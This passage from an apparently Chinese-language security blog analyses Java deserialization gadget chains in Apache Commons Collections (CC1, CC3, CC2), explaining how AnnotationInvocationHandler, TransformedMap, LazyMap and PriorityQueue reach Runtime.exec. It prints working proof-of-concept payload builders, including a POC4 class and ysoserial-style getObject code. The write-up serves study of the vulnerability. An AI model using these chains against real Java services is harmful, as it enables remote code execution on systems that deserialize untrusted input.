class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接运行即可弹计算器</p><p>现在找到了transform的触发方法了，不过我们还要再进一步让其在反序列化的时候触发，那我们就需要找一个类重写了readObject方法并且其中直接或间接调用了transformKey、transformValue、checkSetValue、put方法</p><p>在我们真正开始审计寻找之前先来看两个知识点</p><blockquote><ol><li>TransformedMap是Map类型，</li><li>TransformedMap里的每个entryset在调用setValue方法时会自动调用TransformedMap类的checkSetValue方法(我想，这个也是漏洞作者在挖掘过程中按照我上面提到的那两种策略摸索出来的，而不是他一开始就知道…由于idea不能全局搜索反编译文件中的任意字符串，我也就不能轻松的逆向分析复现出作者的挖掘过程，所以就直接把结论放在这里，然后一会正向分析为什么会自动调用checkSetValue方法）。</li></ol></blockquote><p>还要了解一下Map的entryset</p><blockquote><p>由于Map中存放的元素均为键值对，故每一个键值对必然存在一个映射关系。<br>Map中采用Entry内部类来表示一个映射项，映射项包含Key和Value<br>Map.Entry里面包含getKey()和getValue()方法</p><p>Set&lt;Entry&lt;T,V&gt;&gt; entrySet()<br>该方法返回值就是这个map中各个键值对映射关系的集合。</p><p>可使用它对map进行遍历。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span><span class="token punctuation">></span></span> it<span class="token operator">=</span>map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>it<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> entry<span class="token operator">=</span>it<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> key<span class="token operator">=</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> value<span class="token operator">=</span>entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>key<span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>那么我们下面的策略就是，找到一个重写了<code>readObject</code>方法的类，并且其对某个Map类型的属性进行了setValue的操作，于是就找到了<code>sun.reflect.annotation.AnnotationInvocationHandler</code>类，但是由于这是个JDK的内置类，所以会导致这个payload只能在部分java版本上生效，而java在JDK1.8的部分版本上更新了这个类，所以某些JDK1.8及以上是无法使用这个payload</p><p>知道了这些我们再往下走，先看看JDK1.8和JDK1.7的区别</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//JDK1.8    </span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">GetField</span> var2 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">readFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> var3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> var4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"memberValues"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">AnnotationType</span> var5 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            var5 <span class="token operator">=</span> <span class="token class-name">AnnotationType</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> var13<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Non-annotation type in annotation serial stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Map</span> var6 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">LinkedHashMap</span> var7 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> var10<span class="token punctuation">;</span>        <span class="token class-name">Object</span> var11<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Iterator</span> var8 <span class="token operator">=</span> var4<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> var8<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> var7<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>var10<span class="token punctuation">,</span> var11<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Entry</span> var9 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token punctuation">)</span>var8<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>var9<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var11 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token class-name">Class</span> var12 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span>var6<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var10<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var12 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                var11 <span class="token operator">=</span> var9<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var12<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>var11<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>var11 <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    var11 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>var11<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> var11 <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMember</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Method</span><span class="token punctuation">)</span>var5<span class="token punctuation">.</span><span class="token function">members</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var10<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;JDK1.7private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;    var1.defaultReadObject();    AnnotationType var2 &#x3D; null;    try &#123;        var2 &#x3D; AnnotationType.getInstance(this.type);    &#125; catch (IllegalArgumentException var9) &#123;        throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);    &#125;    Map var3 &#x3D; var2.memberTypes();    Iterator var4 &#x3D; this.memberValues.entrySet().iterator();    while(var4.hasNext()) &#123;        Entry var5 &#x3D; (Entry)var4.next();        String var6 &#x3D; (String)var5.getKey();        Class var7 &#x3D; (Class)var3.get(var6);        if (var7 !&#x3D; null) &#123;            Object var8 &#x3D; var5.getValue();            if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;                var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));&#x2F;*setValue在这里*&#x2F;            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到在JDK1.8中已经没有了<code>setValue</code>操作，所以以下内容我们都基于JDK1.7来进行<code>private final Map&lt;String, Object&gt; memberValues</code>这里的<code>memberValues</code>是我们可控的</p><p>下面我们就要满足进入方法的条件了<code>(!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy))</code>，isInstance表示前面的能否强制转为后面这种类型，instanceof表示前者是不是后者这种类型，那么我们看看如何才能满足这个if条件</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">var7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span>var3<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span>var8 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//也就是从ver5中取出的值</span>var5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token punctuation">)</span>var4<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//ver4也就是整个map的映射表</span>var3 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//map映射出的所有object类型列表</span>var2 <span class="token operator">=</span> <span class="token class-name">AnnotationType</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token comment">//此处this.type可控</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处我们可以看构造函数来知道那些哪些内容可控</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">AnnotationInvocationHandler</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">Annotation</span><span class="token punctuation">></span></span> var1<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">isAnnotation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> var3<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> var3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token class-name">Annotation</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> var1<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues <span class="token operator">=</span> var2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationFormatError</span><span class="token punctuation">(</span><span class="token string">"Attempt to create proxy for a non-annotation type."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到this.type就是var1，也就是一个继承了Annotation的类，关于Annotation是什么可以去看Java小点文章，这里不再赘述，所有的注解都是Annotation这个接口的子类，这里我们使用<code>java.lang.annotation.Retention</code>这个注解类，我们先尝试使用这个类来生成POC看看是否合法</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class POC4 &#123;    public static void main(String[] args) throws Exception&#123;        Transformer[] transformers_exec &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;wireshark&quot;&#125;)        &#125;;        Transformer chain &#x3D; new ChainedTransformer(transformers_exec);        HashMap innerMap &#x3D; new HashMap();        innerMap.put(&quot;value&quot;,&quot;asdf&quot;);                Map outerMap &#x3D; TransformedMap.decorate(innerMap,null,chain);                &#x2F;&#x2F; 通过反射机制实例化AnnotationInvocationHandler        Class clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor cons &#x3D; clazz.getDeclaredConstructor(Class.class,Map.class);        cons.setAccessible(true);        Object ins &#x3D; cons.newInstance(java.lang.annotation.Retention.class,outerMap);        &#x2F;&#x2F; 序列化        ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream();        ObjectOutputStream oos &#x3D; new ObjectOutputStream(baos);        oos.writeObject(ins);        oos.flush();        oos.close();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里由于AnnotationInvocationHandler构造函数并非公开，所以我们通过反射来构造对应类，再来加一个关于反射获取构造函数的小点</p><ol><li>Class类的getConstructor()方法,无论是否设置setAccessible(),都不可获取到类的私有构造器</li><li>Class类的getDeclaredConstructor()方法,可获取到类的私有构造器(包括带有其他修饰符的构造器），但在使用private的构造器时，必须设置setAccessible()为true,才可以获取并操作该Constructor对象</li></ol><p>OK我们构造完成后进行反序列化尝试，发现运行成功，不过我们前面还有个问题没有解决，就是为什么<em><strong>TransformedMap里的每个entryset在调用setValue方法时会自动调用TransformedMap类的checkSetValue方法</strong></em></p><p>我们跟入反序列化，在<code>AbstractInputCheckedMapDecorator.java</code>中有这么一条，可以看到进入后就直接调用了<code>parent</code>的<code>checkSetValue</code>方法<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211151817266.png"></p><p>破案咯～</p><p><strong>LazyMap</strong></p><p>下面我们就要进行完整的调用链构造了，RCE的部分我们已经完成了，下一步就是找在<code>readObject</code>方法中调用了可控参数的<code>transform</code>方法的类了，这里ysoserial链子使用的是<code>AnnotationInvocationHandler</code>–&gt;<code>LazyMap#get()</code></p><p>先来看看<code>AnnotationInvocationHandler</code><em><strong>#注释信息处理</strong></em>，其中的<code>readObject</code>方法中并没有直接调用到<code>Map</code> 的<code>get</code>方法，但是在 <code>AnnotationInvocationHandler#invoke()</code> 方法调用了 <code>get</code> 方法，<code>this.memberValues</code>可控并且为<code>Map</code>类，那么我们找个实现了Map接口的类即可，此处利用的是<code>LazyMap</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211110059774.png"></p><p>我们继续跟入，发现<code>LazyMap</code>重写了<code>get</code>方法如下，对<code>factory</code>属性的<code>transform</code>方法进行了调用，此处的factory为Transformer类，使用其的实现类即可（也就是我们用来RCE的ChainedTransformer）</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211110105849.png"></p><p>现在的问题就是我们如何调用<code>AnnotationInvocationHandler#invoke()</code>方法了，这里涉及到的知识就是Java的动态代理，我们可以创建一个<code>AnnotationInvocationHandler</code>代理类，然后在调用<code>AnnotationInvocationHandler</code>代理类中的任意方法都会先调用<code>AnnotationInvocationHandler#invoke()</code>方法，是因为我们在调用类内非静态</p><p>总结一下现有的链子，我们先创建一个<code>LazyMap</code>对象，将其中的<code>factory</code>设置为构造好的<code>ChainedTransformer</code>，这样在调用<code>LazyMap</code>的<code>get</code>方法时就能链式调用导致RCE了，那我们现在再分析一下Poc</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public class CommonsCollections1 extends PayloadRunner implements ObjectPayload&lt;InvocationHandler&gt; &#123;public InvocationHandler getObject(final String command) throws Exception &#123;final String[] execArgs &#x3D; new String[] &#123; command &#125;;&#x2F;&#x2F;开一个chainedTransformerfinal Transformer transformerChain &#x3D; new ChainedTransformer(new Transformer[]&#123; new ConstantTransformer(1) &#125;);&#x2F;&#x2F;真正的链子final Transformer[] transformers &#x3D; new Transformer[] &#123;new ConstantTransformer(Runtime.class),new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),new InvokerTransformer(&quot;exec&quot;,new Class[] &#123; String.class &#125;, execArgs),new ConstantTransformer(1) &#125;;final Map innerMap &#x3D; new HashMap();final Map lazyMap &#x3D; LazyMap.decorate(innerMap, transformerChain);final Map mapProxy &#x3D; Gadgets.createMemoitizedProxy(lazyMap, Map.class);final InvocationHandler handler &#x3D; Gadgets.createMemoizedInvocationHandler(mapProxy);Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers); &#x2F;&#x2F; arm with actual transformer chainreturn handler;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="CommonsCollections3"   >          <a href="#CommonsCollections3" class="heading-link"><i class="fas fa-link"></i></a><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h2>      <p>巧了这次没链子了（</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;* * Variation on CommonsCollections1 that uses InstantiateTransformer instead of * InvokerTransformer. *&#x2F; &#x2F;&#x2F;InvocationHandler-&gt;Map(Proxy)-&gt;ChainedTransformer-&gt;InstantiateTransformer.transform-&gt;input.getConstructor(javax.xml.transform.Templates)-&gt;con.newInstance(恶意字节码)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> command<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span><span class="token class-name">Object</span> templatesImpl <span class="token operator">=</span> <span class="token class-name">Gadgets</span><span class="token punctuation">.</span><span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// inert chain for setup</span><span class="token keyword">final</span> <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// real chain for after setup</span><span class="token keyword">final</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> templatesImpl <span class="token punctuation">&#125;</span> <span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">final</span> <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">final</span> <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">final</span> <span class="token class-name">Map</span> mapProxy <span class="token operator">=</span> <span class="token class-name">Gadgets</span><span class="token punctuation">.</span><span class="token function">createMemoitizedProxy</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">final</span> <span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token class-name">Gadgets</span><span class="token punctuation">.</span><span class="token function">createMemoizedInvocationHandler</span><span class="token punctuation">(</span>mapProxy<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">,</span> <span class="token string">"iTransformers"</span><span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// arm with actual transformer chain</span><span class="token keyword">return</span> handler<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>乍一看和CC1很像，但是可以看到和CC1链子中不同的地方是使用了<code>createTemplatesImpl</code>，并且tranform链子也略有不同，用了<code>InstantiateTransformer</code>，我们先跟进去看一下构造函数与transform相结合出现什么</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211152035657.png"></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211152036128.png"></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211152040931.png"></p><p>代码加上类中定义的内容我们知道添加这个对象相当于调用<code>TrAXFilter</code>的构造函数生成一个对象，再看传入的参数得知相当于执行了<code>new TrAXFilter(templatesImpl)</code></p><p>再看构造函数中调用了templates的newTransformer方法，和CB1链一致，结束</p>        <h2 id="CommonsCollections2"   >          <a href="#CommonsCollections2" class="heading-link"><i class="fas fa-link"></i></a><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h2>      <p>链子来了嗷</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*Gadget chain:PriorityQueue.readObject()PriorityQueue.heapify()PriorityQueue.siftDown()   PriorityQueue.siftDownUsingComparator()      TransformingComparator.compare()         InvokerTransformer.transform()            method.invoke()               TemplatesImpl.newTransformer()                  TemplatesImpl.getTransletInstance() */</span><span class="token comment">//PriorityQueue->TransformingComparator->InvokerTransformer->TemplatesImpl</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看着怎么又和CB1扯上关系了，不过在compare处还是有些微的不同的，所以还是来分析一下吧</p><p>前面的Queue部分我们直接跳过，来看siftDownUsingComparator之后的链子</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211171943991.png"></p><p>此时调用<code>Comparator</code>的compare方法，跟入</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211171944282.png"></p><p>继续走InvokerTransformer的transform方法（此处就和CC1连起来了），跟入transform与CC1触发相同，调用了newTransformer方法触发字节码读取执行命令</p><pre class="line-numbers language-none"><code class="language-none">public Queue&lt;Object&gt; getObject(final String command) throws Exception &#123;final Object templates &#x3D; Gadgets.createTemplatesImpl(command);&#x2F;&#x2F; mock method name until armedfinal InvokerTransformer transformer &#x3D; new InvokerTransformer(&quot;toString&quot;, new Class[0], new Object[0]);&#x2F;&#x2F; create queue with numbers and basic comparatorfinal PriorityQueue&lt;Object&gt; queue &#x3D; new PriorityQueue&lt;Object&gt;(2,new TransformingComparator(transformer));&#x2F;&#x2F; stub data for replacement laterqueue.add(1);queue.add(1);&#x2F;&#x2F; switch method called by comparatorReflections.setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);&#x2F;&#x2F; switch contents of queuefinal Object[] queueArray &#x3D; (Object[]) 